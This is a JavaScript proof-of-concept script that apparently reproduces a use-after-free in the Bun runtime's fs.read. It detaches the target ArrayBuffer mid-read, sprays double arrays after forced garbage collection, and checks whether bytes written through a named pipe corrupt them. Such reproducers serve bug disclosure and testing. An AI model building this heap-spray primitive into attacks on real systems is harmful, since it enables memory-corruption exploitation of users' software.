import fs from "node:fs";
import { spawnSync } from "node:child_process";
import { join } from "node:path";
import { tmpdir } from "node:os";

const iterations = Number(process.env.ITERATIONS || 64);
const size = Number(process.env.BUF_SIZE || 8192);
const sprayCount = Number(process.env.SPRAY_COUNT || 4096);
const slots = Number(process.env.SLOTS || 1024);
const writeOffset = Number(process.env.WRITE_OFFSET || 144);
const writeLength = Number(process.env.WRITE_LENGTH || 8);
const magic = Number(process.env.MAGIC_DOUBLE || 6.02214076e23);
const path = join(tmpdir(), `bun-fs-read-array-double-write-${process.pid}`);
const retained = [];

if (writeOffset < 0 || writeLength <= 0 || writeOffset + writeLength > size) {
  throw new Error("WRITE_OFFSET/WRITE_LENGTH must fit in BUF_SIZE");
}

const mkfifo = spawnSync("mkfifo", [path], { stdio: "inherit" });
if (mkfifo.status !== 0) throw new Error(`mkfifo failed with status ${mkfifo.status}`);
const fd = fs.openSync(path, fs.constants.O_RDWR);

function detach(ab) {
  if (typeof ab.transfer === "function") ab.transfer(0);
  else structuredClone({}, { transfer: [ab] });
}

function gcNow() {
  if (typeof globalThis.Bun?.gc === "function") globalThis.Bun.gc(true);
  if (typeof globalThis.gc === "function") globalThis.gc();
}

function allocateDoubleArrays() {
  const out = [];
  for (let i = 0; i < sprayCount; i++) {
    const arr = new Array(slots);
    for (let j = 0; j < slots; j++) arr[j] = 13.37 + i + (j / 1024);
    out.push(arr);
  }
  return out;
}

function makePayload() {
  const payload = Buffer.alloc(writeLength, 0x44);
  payload.writeDoubleLE(magic, 0);
  return payload;
}

function findMagic() {
  for (let i = 0; i < retained.length; i++) {
    const arr = retained[i];
    for (let j = 0; j < Math.min(slots, 32); j++) {
      if (Object.is(arr[j], magic)) {
        return { arrayIndex: i, elementIndex: j, value: arr[j] };
      }
    }
  }
  return null;
}

async function runOne(iteration) {
  const ab = new ArrayBuffer(size);
  const view = new Uint8Array(ab);
  view.fill(0x51);

  const done = new Promise(resolve => {
    fs.read(fd, view, writeOffset, writeLength, null, (err, bytesRead) => {
      resolve({ err, bytesRead });
    });
  });

  detach(ab);
  gcNow();
  retained.length = 0;
  retained.push(...allocateDoubleArrays());
  gcNow();

  fs.writeSync(fd, makePayload(), 0, writeLength);
  const result = await done;
  const found = findMagic();

  console.log(JSON.stringify({
    iteration,
    size,
    sprayCount,
    slots,
    writeOffset,
    writeLength,
    magic,
    bytesRead: result.bytesRead,
    err: result.err?.message,
    found,
  }));

  return Boolean(found);
}

try {
  for (let i = 1; i <= iterations; i++) {
    if (await runOne(i)) {
      process.exitCode = 86;
      break;
    }
  }
} finally {
  fs.closeSync(fd);
  fs.unlinkSync(path);
}
